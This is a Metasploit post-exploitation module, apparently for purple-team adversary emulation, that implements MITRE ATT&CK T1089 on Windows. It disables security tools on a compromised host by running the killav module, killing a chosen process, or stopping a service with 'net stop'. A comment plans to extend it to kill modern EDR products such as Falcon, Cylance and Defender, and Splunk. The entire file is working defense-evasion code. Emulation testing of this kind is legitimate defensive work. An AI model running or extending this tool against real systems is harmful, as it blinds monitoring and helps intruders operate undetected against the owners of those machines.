##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Accounts
  include Msf::Post::Windows::Services

  def initialize(info={})
    super(update_info(info,
                      'Name'          => 'Disabling Security Tools (T1089) Windows - Purple Team',
                      'Description'   => %q{
                        Defense Evasion:
                        Adversaries may disable security tools to avoid possible detection of their tools and activities. This can take the form of killing security software or event logging processes, deleting Registry keys so that tools do not start at run time, or other methods to interfere with security scanning or event reporting.},
                      'License'       => MSF_LICENSE,
                      'Author'        => [ 'Praetorian' ],
                      'References'    => [ [ 'URL', 'https://attack.mitre.org/wiki/Technique/T1089' ] ],
                      'Platform'      => [ 'win' ],
                      'SessionTypes'  => [ 'meterpreter' ]
                     ))
    register_options(
    [
      OptString.new("MODULE", [ true, "Module to execute", 'post/windows/manage/killav']),
      OptString.new("METHOD", [ true, "Method of execution: 1=KillAV Module, 2=Process name/PID, 3=Service name/path", "1"]),
      OptString.new("IDENTIFIER", [ false, "Process or service name, path, or PID.", ""])
    ])
  end

  def run_module(mod)
      framework_mod = framework.modules.create(mod)
      framework_mod.datastore['SESSION'] = datastore['SESSION']
      framework_mod.datastore['VERBOSE'] = datastore['VERBOSE']
      framework_mod.datastore['WORKSPACE'] = datastore["WORKSPACE"] if datastore["WORKSPACE"]
      framework_mod.run_simple(
          'LocalInput' => self.user_input,
          'LocalOutput' => self.user_output,
          'RaiseExceptions' => true,
          'RunAsJob'  => false)
  end

  def run
  #
  #
  #
    begin

      case datastore['METHOD']
      when '1'
        # TODO the killAV wordlist is outdated - does not have falcon, cylance, defender, etc.
        # update module to identify modern EDRs and also kill stuff like splunk
        mod = datastore['MODULE']
        print_status("Executing '#{mod}' on #{session.inspect}")
        run_module(mod)
      when '2'
        print_warning("Killing process '#{datastore['IDENTIFIER']}' may have failed.") unless t1089_proc(datastore['IDENTIFIER'])
      when '3'
        print_warning("Stopping service '#{datastore['IDENTIFIER']}' may have failed.") unless t1089_svc(datastore['IDENTIFIER'])
      else
        print_error("Invalid method of execution selected.")
      end

      print_good("Module T1089W execution successful.")

    rescue ::Exception => e
        print_error("#{e.class}: #{e.message}")
        print_error("Module T1089W execution failed.")
    end
  end


  def t1089_proc(identifier)
  #
  #
  #
    raise "Process name or PID required." unless not identifier.empty?

    print_status("Looking for process '#{identifier}'...")
    client.sys.process.each_process do |process|
      if identifier.to_i.to_s == identifier
        if process['pid'] == identifier.to_i
          print_status("Killing #{process['name']}")
          return client.sys.process.kill(process['pid'])
        end
      end
      if process['name'] == identifier
       print_status("Killing #{process['name']}.")
       return  client.sys.process.kill(process['pid'])
      end
    end
    return false
  end


  def t1089_svc(identifier)
  #
  #
  #
    raise "Service name or path required." unless not identifier.empty?

    # try by display name first
    print_status("Attempting to stop service '#{identifier}' by display name.")
    print_status("Executing `net stop \"#{identifier}\"' on #{session.inspect}")
    output = cmd_exec("net stop \"#{identifier}\"")
    print_status(output)
    return true unless not (output =~ /success/i)

    # try by service name
    print_status("Attempting to stop service '#{identifier}' by service name.")
    case service_stop(identifier)
    when 0
      return true
    when 1
      print_good("Service already stopped.")
    when 2
      return false
    end
  end

end
